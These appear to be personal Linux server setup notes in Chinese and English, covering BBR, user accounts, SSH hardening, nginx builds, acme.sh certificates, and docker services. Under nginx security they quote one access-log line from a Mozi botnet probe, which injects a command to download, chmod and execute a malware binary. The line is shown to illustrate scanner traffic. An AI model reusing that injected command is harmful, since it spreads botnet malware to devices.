## kernel

> BBR

kernel version >= 4.9.x

```bash
echo "net.core.default_qdisc=fq" >> /etc/sysctl.conf
echo "net.ipv4.tcp_congestion_control=bbr" >> /etc/sysctl.conf

sysctl -p
```

```bash
sysctl net.ipv4.tcp_available_congestion_control

# net.ipv4.tcp_available_congestion_control = bbr cubic reno

lsmod | grep bbr
# tcp_bbr                20480  14
```

## network

> ipv6 隧道

<https://www.tunnelbroker.net/>

> KCPTUN

<https://github.com/xtaci/kcptun/>

> frp

<https://github.com/fatedier/frp>

## config

### Users_and_groups

`root`

根用户

nologin

`lux`

主用户

sudo

ssh

/home/lux

`sync`

同步用户

ssh

nologin?

/home/sync

`watchman`

守护用户

nologin

```bash
# lux
useradd -m lux
passwd
### /etc/sudoers
visudo
#### lux    ALL=(ALL:ALL) ALL
usermod -s /bin/zsh lux
# sync
useradd -m sync
passwd
# watchman
useradd -r -s /usr/bin/nologin watchman
passwd
```

### ssh

`/etc/ssh/sshd_config`

```ssh-config
Port 22

# 禁止空密码账户登入（默认禁止）
PermitEmptyPasswords no

# 禁止 root 账户通过 SSH 登入
PermitRootLogin no

# Logging
SyslogFacility AUTH
LogLevel INFO
```

```bash
journalctl -u sshd |tail -100
```

## application

### nginx

> module

<http://nginx.org/en/download.html>

[brotli]<https://github.com/google/ngx_brotli>

```bash
wget http://nginx.org/download/nginx-1.19.2.tar.gz
tar -xvzf nginx-1.19.2.tar.gz

### ngx_brotli
git clone https://github.com/google/ngx_brotli.git /usr/local/src/ngx_brotli
git submodule update --init

# + using system PCRE library
# + using system OpenSSL library
# + using system zlib library

apt-get install libpcre3 libpcre3-dev
apt-get install zlib1g-dev
apt-get install openssl libssl-dev

./configure --add-module=/usr/local/src/ngx_brotli --with-http_stub_status_module --with-http_ssl_module --with-http_v2_module

make && make install

# 查看
nginx -V
```

`nginx -V`

```
nginx version: nginx/1.19.2
built by gcc 8.3.0 (Debian 8.3.0-6)
built with OpenSSL 1.1.1d  10 Sep 2019
TLS SNI support enabled
configure arguments: --add-module=/usr/local/src/ngx_brotli --with-http_stub_status_module --with-http_ssl_module --with-http_v2_module
```

> systemd

`nginx.service`

```
[Unit]
Description=nginx - nginx is nginx
Documentation=http://nginx.org/en/docs/
After=network.target remote-fs.target nss-lookup.target

[Service]
Type=forking
PIDFile=/usr/local/nginx/logs/nginx.pid
ExecStartPre=/usr/local/bin/nginx -t
ExecStart=/usr/local/bin/nginx
ExecReload=/bin/kill -s HUP $MAINPID
ExecStop=/bin/kill -s QUIT $MAINPID
PrivateTmp=true

[Install]
WantedBy=multi-user.target
```

```bash
mkdir -p /etc/systemd/system/nginx.service.d
printf "[Service]\nExecStartPost=/bin/sleep 0.1\n" > /etc/systemd/system/nginx.service.d/override.conf

systemctl daemon-reload
systemctl restart nginx.service
```

> config

<https://www.digitalocean.com/community/tools/nginx>

`nginx.conf`

```nginx
# nginx 的 default_server 指令可以定义默认的 server 去处理一些没有匹配到 server_name 的请求，如果没有显式定义，则会选取第一个定义的 server 作为 default_server
listen 80 default_server;
server_name _; # _ 并不是重点 __ 也可以 ___也可以
```

`mime.types`

```nginx
text/markdown md markdown;
```

> log

<https://segmentfault.com/a/1190000019382893>

> secure

<https://blog.naibabiji.com/skill/nginx-fang-sao-miao.html>

```
[info] 26014#0: *46 client sent invalid method while reading client request line, client: x.x.x.x, server: _, request: "27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0"
```

### SSL

> acme.sh

<https://github.com/acmesh-official/acme.sh>

<https://github.com/acmesh-official/acme.sh/wiki/%E8%AF%B4%E6%98%8E>

```bash
curl  https://get.acme.sh | sh
```

```bash
### nginx
acme.sh --issue -d 0x64.ml --nginx
### webroot
acme.sh --issue -d 0x64.ml -d www.0x64.ml --webroot /var/www/0x64.ml/
### installcert
acme.sh --installcert -d 0x64.ml \
--key-file       /etc/ssl/custom.certs/0x64.ml/key.pem  \
--fullchain-file /etc/ssl/custom.certs/0x64.ml/cert.pem \
--reloadcmd     "service nginx force-reload"
```

`nginx.config`

```nginx
  ssl_certificate /usr/local/nginx/ssl/0x64.ml/cert.pem;
  ssl_certificate_key /usr/local/nginx/ssl/0x64.ml/key.pem;
```

> 迪菲-赫尔曼密钥

```bash
openssl dhparam -out /etc/ssl/custom.certs/dhparams.pem 2048
```

`nginx.config`

```nginx
  ssl_dhparam /etc/ssl/certs/dhparams.pem;
```

> nginx config

<https://ssl-config.mozilla.org/>

TODO: `ssl_stapling`

> test

<https://www.ssllabs.com/ssltest/index.html>

### v2ray

- <https://github.com/v2fly/fhs-install-v2ray/blob/master/README.zh-Hans-CN.md>

- `golang-v2ray-core`(debian)

### 内网穿透代理

### docker

<https://docs.docker.com/engine/install/debian/>

```bash
docker exec -it shiori sh
```

### github actions

### IP address lookup service

<https://github.com/mpolden/echoip>

```bash
curl ip.gs
curl ip.0x64.ml
```

### 浏览器相关

书签同步

#### 阅读列表

> shiori

<https://github.com/go-shiori/shiori>

```bash
docker run -d --rm --name shiori -p 28793:8080 -v /srv/shiori/:/srv/shiori radhifadlillah/shiori
```

#### 密码同步

```bash
docker run -d --name bitwarden \
  -e ADMIN_TOKEN=TOKEN \
  -v /srv/bitwarden/:/data/ \
  -p 28941:80 \
  bitwardenrs/server:latest
```

网站黑名单同步

## secure

> 防火墙

> ssh 安全配置

> Fail2Ban

<https://aws.amazon.com/cn/blogs/china/open-source-tool-to-protect-ec2-instances-fail2ban/>

> robots

## others

> timezone

```bash
tzselect

ln -s /usr/share/zoneinfo/Asia/Shanghai /etc/localtime
vim /etc/timezone
```

```
Asia/Shanghai
```

TODO: 日期为 12 小时制

```bash
date

Tue 22 Sep 2020 06:26:05 PM CST
```

> vim

```
;vim显示上下几行
set relativenumber
; 粘贴模式
:set nopaste
```
